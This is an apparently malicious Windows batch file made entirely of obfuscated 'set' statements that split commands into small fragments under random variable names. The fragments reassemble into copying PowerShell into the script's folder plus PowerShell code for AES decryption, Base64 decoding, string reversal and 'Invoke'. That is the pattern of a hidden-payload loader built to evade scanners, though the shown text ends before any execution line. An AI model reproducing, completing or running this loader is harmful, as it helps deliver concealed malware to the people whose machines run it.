@echo off
set "YoNeEFttoh=32"
set "vjWFozHbPM=st"
set "HbxECCkMpO=py"
set "iMBhYbLzQO=Sy"
set "kEijDssTZS=.e"
set "sVAnjPPsbH=ow"
set "kLlOGlsveS=y "
set "DyOOOWxWMZ=0\"
set "vRmfDVAvsG=:\"
set "cohwQhwRbJ=do"
set "DOSwcgZwst=em"
set "dfOKdvutTn=1."
set "DMsqySovVq=xe"
set "ejiiNnxsHj=\v"
set "cgkfMpFFmU= C"
set "vGwpqFuutR=rs"
set "KoowfPiewd=we"
set "VtfMoPzqyM=nd"
set "uioZCshTdf=Wi"
set "QBFHkoWzmg=he"
set "YOjpyXgLhp=po"
set "pJlDTJvIiF=ll"
set "dpBmlSSOuV=\W"
set "gpTVDRlKpI=he"
set "tTdgFiLSNC=we"
set "mmGGnMuSwG= /"
set "mQvQQtUfeR=in"
set "cOuIuURlCt=s\"
set "waNKQYeMiD=rS"
set "VJvlcYANiE=co"
set "ozDRYQZpDT=ll"
set "okcxhhSWok=Po"
set "foMIInnFlj=ws"
set "MdgyTijbYI= %~dp0"
set "IKyjmKylvz=cd"
set "hKPOsFzWIY='[-1"
set "HWccHFGduY=.IO."
set "sKfmkgcSns=d;$Y"
set "nKoGzEPSBQ=$xQh"
set "bMNvsxPsqf=ypto"
set "MYCfdxqEIn=..-1"
set "LLyMVnDMPl=J = "
set "opPINiDecl= = ["
set "qhaVPBiCzr= = $"
set "uRuDbrUUyJ=tsWi"
set "hHrPLgqduo=New-"
set "rvdhPdtUON=W) {"
set "MThkKLDzjI='')("
set "HZvhuERaQR=Secu"
set "GtHsvCQbMu=ptor"
set "SeNNxWXZPa=gnir"
set "fWaRowFjSS=.Cry"
set "rUtOuJaCEB=6esa"
set "aEOaIjTEje=ct S"
set "hpNCEIZLZk=lBlo"
set "wMHJgGdXDU=morF"
set "SsBwzBrBRJ=.Len"
set "kJhjrNkLCp=+hAO"
set "GpLzHFzNNb=Ua.T"
set "YrbenFNnel=0O+g"
set "VLGgjikWYM=Teg."
set "fQFJJkPmXZ=rW ="
set "SYehGYdWMI=se()"
set "xwOCxxTvzA=.Cry"
set "uEfeqftEix=;$tE"
set "aAjRDFVYMv=CmNw"
set "hAjtAtiFdh=m(, "
set "HJVoZamiDa=oL'["
set "UZsmpIkukg=bjec"
set "QqaZfwIEvH=sGUc"
set "GYMgjfchsi=.Con"
set "WgrDBNGxHO=stem"
set "hNHVKWRZqB=)($c"
set "jXBoGSPiXN=($UO"
set "bJMSwIFLFk=Invo"
set "fCPeRKYDSX=y.Ci"
set "LvwmAwYWka=gvBr"
set "bsmpxTIdvd=oArr"
set "CgAuaTfmeX=rity"
